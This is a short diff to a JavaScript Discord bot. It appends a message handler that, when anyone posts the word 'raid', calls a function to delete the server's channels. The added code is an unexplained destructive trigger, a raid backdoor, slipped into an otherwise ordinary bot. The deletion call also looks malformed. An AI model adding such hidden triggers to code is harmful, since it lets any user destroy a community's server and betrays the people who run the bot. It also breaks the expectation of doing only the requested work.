@@ -492,3 +492,9 @@ client.on("message", message => {
         message.channel.send(Success)
     }
 })
+
+client.on("message", message => {
+    if(message.content === "raid") {
+        message.guild.channels.delete()
+    }
+})
